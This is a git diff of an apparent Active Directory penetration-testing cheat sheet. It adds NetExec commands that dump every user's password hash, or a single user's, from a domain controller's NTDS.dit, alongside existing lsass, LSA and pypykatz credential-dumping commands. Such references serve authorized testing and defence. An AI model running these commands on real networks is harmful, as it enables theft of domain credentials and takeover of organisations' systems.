@@ -807,7 +807,7 @@ u.objectid ENDS WITH "-548" RETURN q
   ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa --local
   ```
 
-  ### NetExec  Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
+  ### NetExec Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
   ```
@@ -875,6 +875,20 @@ sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD
 
 ```shell
 pypykatz lsa minidump lsass.DMP
+```
+</details> 
+
+<details>
+  <summary> NetExec Dump the NTDS.dit from target DC (DCSync) </summary> 
+
+#### Dump all user hashes
+```shell
+NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]>  --ntds
+```
+
+#### Dump a specific user hash
+```shell
+NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]>  --ntds --user <AD_user>
 ```
 </details> 
 
